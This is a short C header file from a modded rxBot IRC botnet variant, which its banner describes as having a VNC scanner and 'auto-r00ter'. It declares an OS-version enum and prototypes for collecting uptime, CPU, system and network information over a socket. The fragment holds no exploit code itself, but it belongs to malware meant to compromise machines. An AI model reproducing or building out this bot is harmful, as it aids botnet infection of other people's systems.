/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


enum {OS_UNKNOWN, OS_WIN95, OS_WIN98, OS_WINME, OS_WINNT, OS_WIN2K, OS_WINXP, OS_WIN2K3};

char *Uptime(int startup=0);
int OSVersionCheck(void);

#ifndef NO_SYSINFO
inline unsigned __int64 GetCycleCount(void);
unsigned __int64 GetCPUSpeed(void);
char *sysinfo(char *sinfo, SOCKET sock);
#endif

#ifndef NO_NETINFO
char *netinfo(char *ninfo, char *host, SOCKET sock);
#endif
